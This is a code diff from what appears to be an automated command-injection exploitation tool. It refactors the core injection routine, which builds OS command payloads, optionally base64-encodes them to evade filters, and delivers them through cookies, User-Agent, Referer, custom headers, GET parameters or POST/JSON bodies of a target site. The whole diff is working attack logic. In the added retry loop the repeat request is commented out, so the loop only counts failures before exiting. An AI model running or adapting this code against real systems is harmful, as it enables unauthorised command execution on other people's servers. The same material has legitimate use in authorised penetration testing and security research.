@@ -142,88 +142,102 @@ The main command injection exploitation.
 """
 def injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename):
 
-  if alter_shell:
-    # Classic decision payload (check if host is vulnerable).
-    payload = cb_payloads.cmd_execution_alter_shell(separator, TAG, cmd)
-  else:
-    # Classic decision payload (check if host is vulnerable).
-    payload = cb_payloads.cmd_execution(separator, TAG, cmd)
-    
-  # Fix prefixes / suffixes
-  payload = parameters.prefixes(payload, prefix)
-  payload = parameters.suffixes(payload, suffix)
-
-  # Whitespace fixation
-  payload = re.sub(" ", whitespace, payload)
-
-  if settings.TAMPER_SCRIPTS['base64encode']:
-    from src.core.tamper import base64encode
-    payload = base64encode.encode(payload)
-
-  # Check if defined "--verbose" option.
-  if settings.VERBOSITY_LEVEL >= 1:
-    sys.stdout.write("\n" + settings.print_payload(payload))
-
-  # Check if defined cookie with "INJECT_HERE" tag
-  if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
-    response = cookie_injection_test(url, vuln_parameter, payload)
-
-  # Check if defined user-agent with "INJECT_HERE" tag
-  elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
-    response = user_agent_injection_test(url, vuln_parameter, payload)
-
-  # Check if defined referer with "INJECT_HERE" tag
-  elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
-    response = referer_injection_test(url, vuln_parameter, payload)
-
-  # Check if defined custom header with "INJECT_HERE" tag
-  elif settings.CUSTOM_HEADER_INJECTION:
-    response = custom_header_injection_test(url, vuln_parameter, payload)
-
-  else:
-    # Check if defined method is GET (Default).
-    if http_request_method == "GET":
+  def check_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename):
+    if alter_shell:
+      # Classic decision payload (check if host is vulnerable).
+      payload = cb_payloads.cmd_execution_alter_shell(separator, TAG, cmd)
+    else:
+      # Classic decision payload (check if host is vulnerable).
+      payload = cb_payloads.cmd_execution(separator, TAG, cmd)
       
-      # Check if its not specified the 'INJECT_HERE' tag
-      #url = parameters.do_GET_check(url)
-      
-      target = re.sub(settings.INJECT_TAG, payload, url)
-      vuln_parameter = ''.join(vuln_parameter)
-      request = urllib2.Request(target)
-      
-      # Check if defined extra headers.
-      headers.do_check(request)    
+    # Fix prefixes / suffixes
+    payload = parameters.prefixes(payload, prefix)
+    payload = parameters.suffixes(payload, suffix)
 
-      # Get the response of the request.
-      response = requests.get_request_response(request)
-          
-    else :
-      # Check if defined method is POST.
-      parameter = menu.options.data
-      parameter = urllib2.unquote(parameter)
-      
-      # Check if its not specified the 'INJECT_HERE' tag
-      parameter = parameters.do_POST_check(parameter)
-      
-      # Define the POST data  
-      if settings.IS_JSON == False:
-        data = re.sub(settings.INJECT_TAG, payload, parameter)
-        request = urllib2.Request(url, data)
-      else:
-        payload = payload.replace("\"", "\\\"")
-        data = re.sub(settings.INJECT_TAG, urllib.unquote(payload), parameter)
-        try:
-          data = json.loads(data, strict = False)
-        except:
-          pass
-        request = urllib2.Request(url, json.dumps(data))
-      
-      # Check if defined extra headers.
-      headers.do_check(request)
+    # Whitespace fixation
+    payload = re.sub(" ", whitespace, payload)
 
-      # Get the response of the request.
-      response = requests.get_request_response(request)
+    if settings.TAMPER_SCRIPTS['base64encode']:
+      from src.core.tamper import base64encode
+      payload = base64encode.encode(payload)
 
+    # Check if defined "--verbose" option.
+    if settings.VERBOSITY_LEVEL >= 1:
+      sys.stdout.write("\n" + settings.print_payload(payload))
+
+    # Check if defined cookie with "INJECT_HERE" tag
+    if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
+      response = cookie_injection_test(url, vuln_parameter, payload)
+
+    # Check if defined user-agent with "INJECT_HERE" tag
+    elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
+      response = user_agent_injection_test(url, vuln_parameter, payload)
+
+    # Check if defined referer with "INJECT_HERE" tag
+    elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
+      response = referer_injection_test(url, vuln_parameter, payload)
+
+    # Check if defined custom header with "INJECT_HERE" tag
+    elif settings.CUSTOM_HEADER_INJECTION:
+      response = custom_header_injection_test(url, vuln_parameter, payload)
+
+    else:
+      # Check if defined method is GET (Default).
+      if http_request_method == "GET":
+        
+        # Check if its not specified the 'INJECT_HERE' tag
+        #url = parameters.do_GET_check(url)
+        
+        target = re.sub(settings.INJECT_TAG, payload, url)
+        vuln_parameter = ''.join(vuln_parameter)
+        request = urllib2.Request(target)
+        
+        # Check if defined extra headers.
+        headers.do_check(request)    
+
+        # Get the response of the request.
+        response = requests.get_request_response(request)
+            
+      else :
+        # Check if defined method is POST.
+        parameter = menu.options.data
+        parameter = urllib2.unquote(parameter)
+        
+        # Check if its not specified the 'INJECT_HERE' tag
+        parameter = parameters.do_POST_check(parameter)
+        
+        # Define the POST data  
+        if settings.IS_JSON == False:
+          data = re.sub(settings.INJECT_TAG, payload, parameter)
+          request = urllib2.Request(url, data)
+        else:
+          payload = payload.replace("\"", "\\\"")
+          data = re.sub(settings.INJECT_TAG, urllib.unquote(payload), parameter)
+          try:
+            data = json.loads(data, strict = False)
+          except:
+            pass
+          request = urllib2.Request(url, json.dumps(data))
+        
+        # Check if defined extra headers.
+        headers.do_check(request)
+
+        # Get the response of the request.
+        response = requests.get_request_response(request)
+   
+    return response
+
+  # Do the injection check
+  response = check_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
+  tries = 0
+  while not response:
+    if tries < (settings.FAILED_TRIES / 2):
+      #response = check_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
+      tries = tries + 1
+    else:
+      err_msg = "Something went wrong, the request has failed (" + str(tries) + ") times continuously."
+      sys.stdout.write(settings.print_critical_msg(err_msg)+"\n")
+      sys.exit(0)
   return response
 
 """
